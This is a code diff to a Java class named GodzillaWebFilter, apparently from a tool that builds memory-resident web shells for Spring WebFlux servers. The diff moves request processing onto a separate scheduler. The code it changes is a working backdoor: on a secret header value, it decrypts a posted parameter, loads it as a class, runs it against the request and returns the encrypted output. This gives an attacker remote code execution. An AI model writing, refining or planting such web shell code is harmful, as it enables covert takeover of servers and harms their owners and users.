@@ -1,12 +1,12 @@
 package com.reajason.javaweb.memshell.shelltool.godzilla;
 
-import org.springframework.core.io.buffer.DataBuffer;
 import org.springframework.core.io.buffer.DefaultDataBufferFactory;
 import org.springframework.util.MultiValueMap;
 import org.springframework.web.server.ServerWebExchange;
 import org.springframework.web.server.WebFilter;
 import org.springframework.web.server.WebFilterChain;
 import reactor.core.publisher.Mono;
+import reactor.core.scheduler.Schedulers;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -39,35 +39,36 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
         if (value == null || !value.contains(headerValue)) {
             return chain.filter(exchange);
         }
-        return exchange.getResponse().writeWith(getPost(exchange));
+        return exchange.getFormData()
+                .flatMap(map -> Mono.fromCallable(() -> process(map, exchange))
+                        .subscribeOn(Schedulers.boundedElastic()))
+                .flatMap(bytes -> exchange.getResponse().writeWith(
+                        Mono.just(new DefaultDataBufferFactory().wrap(bytes))));
     }
 
-    private Mono<DataBuffer> getPost(ServerWebExchange exchange) {
-        Mono<MultiValueMap<String, String>> formData = exchange.getFormData();
-        return formData.flatMap(map -> {
-            StringBuilder result = new StringBuilder();
-            try {
-                byte[] data = base64Decode(map.getFirst(pass));
-                data = x(data, false);
-                if (payload == null) {
-                    payload = new GodzillaWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
-                } else {
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = payload.getDeclaredConstructor().newInstance();
-                    f.equals(arrOut);
-                    f.equals(exchange.getRequest());
-                    f.equals(data);
-                    f.toString();
-                    result.append(md5.substring(0, 16));
-                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
-                    result.append(md5.substring(16));
-                }
-            } catch (Throwable e) {
-                e.printStackTrace();
-                result.append(getErrorMessage(e));
+    private byte[] process(MultiValueMap<String, String> map, ServerWebExchange exchange) {
+        StringBuilder result = new StringBuilder();
+        try {
+            byte[] data = base64Decode(map.getFirst(pass));
+            data = x(data, false);
+            if (payload == null) {
+                payload = new GodzillaWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
+            } else {
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f = payload.getDeclaredConstructor().newInstance();
+                f.equals(arrOut);
+                f.equals(exchange.getRequest());
+                f.equals(data);
+                f.toString();
+                result.append(md5.substring(0, 16));
+                result.append(base64Encode(x(arrOut.toByteArray(), true)));
+                result.append(md5.substring(16));
             }
-            return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
-        });
+        } catch (Throwable e) {
+            e.printStackTrace();
+            result.append(getErrorMessage(e));
+        }
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     @SuppressWarnings("all")
